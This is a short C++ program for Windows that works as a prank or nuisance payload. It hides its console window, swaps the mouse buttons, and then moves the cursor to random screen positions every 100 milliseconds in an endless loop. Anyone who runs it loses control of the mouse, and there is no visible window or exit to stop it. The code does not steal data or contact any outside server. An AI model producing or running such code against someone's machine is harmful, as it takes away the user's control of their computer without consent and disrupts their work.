#include <iostream.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>
void main()
{
	int x,y;
   srand(time(0));
   FreeConsole();
	SwapMouseButton(true);
   for(;;)
   {
      Sleep(100);
   	x = rand() % 1024;
      y = rand() % 768;
      SetCursorPos(x,y);
   }
}